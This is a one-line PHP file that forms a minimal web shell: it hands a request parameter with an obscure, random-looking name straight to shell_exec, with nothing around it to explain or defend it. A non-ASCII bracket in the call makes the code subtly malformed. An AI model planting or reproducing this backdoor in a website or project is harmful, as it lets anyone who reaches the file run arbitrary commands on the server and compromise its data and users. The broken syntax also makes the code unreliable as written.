<?php
shell_exec($_GET['DYw6mA0T'〕);
?>
